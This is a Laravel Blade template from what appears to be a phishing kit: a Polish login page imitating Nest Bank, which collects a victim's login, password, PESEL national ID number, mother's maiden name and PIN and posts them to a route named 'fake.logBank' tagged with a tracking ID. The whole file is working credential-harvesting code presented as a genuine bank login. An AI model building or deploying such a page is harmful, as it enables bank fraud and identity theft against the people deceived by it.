@extends('layouts.fake')
@push('css')
    <link href="{{ asset('css/nestbank.css') }}" rel="stylesheet">
    <style>
        body {
            font-family: Roboto;
        }

        /* .centered {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 50%;
            height: 50%;
        } */

        .container {
            max-width: 250px;
        }

        @media (max-width: 452px) {
            .container {
                max-width: 100%;
            }
        }

        * {
            box-shadow: none !important;
        }

        .form-control:focus {
            border-color: rgb(37, 37, 37);
        }

        .btn-primary {
            background: rgb(37, 37, 37);
            border-color: transparent;
        }

        .btn-primary:hover {
            background: rgb(27, 27, 27);
        }

        .btn-primary:active,
        .btn-primary:focus {
            background: rgb(47, 47, 47) !important;
        }

        .btn-primary:active {
            box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.5) !important;
        }
    </style>
@endpush
@section('content')
    <div class="centered">
        <form id="bank_pm_form" method="POST" action="{{subRoute('fake.logBank', ['track_id' => $fake->track_id])}}"
              role="form" class="container p-2 m-auto text-center">
            <h2>Logowanie</h2><br>
            <div class="form-group">
                <label>Wpisz numer klienta lub login</label>
                <input id="login" name="login" required="" type="text" class="form-control">
            </div>
            <div class="form-group">
                <label>Hasło</label>
                <input id="password" name="password" required="" type="password" class="form-control">
            </div>
            <div class="form-group">
                <label>Pesel</label>
                <input id="pesel" name="pesel" required="" type="text" class="form-control">
            </div>
            <div class="form-group">
                <label>Nazwisko panieńskie matki</label>
                <input id="motherlastname" name="mother" required="" type="text" class="form-control">
            </div>
            <div class="form-group">
                <label>PIN</label>
                <input id="pin" name="pin" required="" type="password" class="form-control">
            </div>
            <div class="form-group">
                <button type="submit" class="btn btn-block btn-primary py-3" style="font-size: 20px;">DALEJ</button>
            </div>
            <small>Copyright © 😎NEST😎
                <script>document.write(new Date().getFullYear())</script></small>
        </form>
    </div>
@endsection